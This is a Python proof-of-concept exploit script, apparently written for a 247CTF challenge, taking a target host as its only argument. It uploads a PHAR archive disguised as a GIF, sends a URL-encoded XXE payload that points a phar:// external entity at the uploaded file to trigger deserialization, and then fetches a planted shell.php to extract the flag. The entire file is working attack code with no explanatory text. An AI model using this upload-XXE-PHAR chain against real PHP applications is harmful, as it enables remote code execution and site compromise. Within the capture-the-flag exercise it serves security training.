#!/usr/bin/python3

# PoC for Challenge
# William Moody
# 10.04.2021

import requests
import urllib
import subprocess
import re
import sys

if len(sys.argv) != 2:
    print("Usage: %s RHOST" % sys.argv[0])
    sys.exit(-1)

RHOST = sys.argv[1]

print("[*] Generating phar/image...")
tmp = subprocess.check_output(["php","generatePhar.php"])

print("[*] Uploading Phar/image...")
phar_img = open("poc.phar","rb").read()
f = {"image":("poc.gif", phar_img, "image/gif")}
r = requests.post('http://%s'%RHOST,
    files=f)

if 'Uploaded' not in r.text:
    print("[-] Failed")
    sys.exit(-1)

print("[*] POST'ing XML...")
payload = urllib.parse.quote('<!DOCTYPE foo [<!ELEMENT foo ANY>'+\
    '<!ENTITY % xxe SYSTEM "phar:///var/www/html/images/poc.gif">%xxe;]><message><to></to><from></from>'+\
    '<title></title><body>F</body></message>')
r = requests.post('http://%s'%RHOST,
    data='message='+payload,
    headers={'Content-Type':'application/x-www-form-urlencoded'}
)

if 'saved!' not in r.text:
    print("[-] Failed")
    sys.exit(-1)

print("[*] Removing phar/image...")
subprocess.Popen(["rm","poc.phar"])

r = requests.get("http://%s/images/shell.php" % RHOST)
print("[*] Retrieving flag...")
print("    -- "+re.search(r"247CTF\{[0-9a-f]{32}\}",r.text)[0])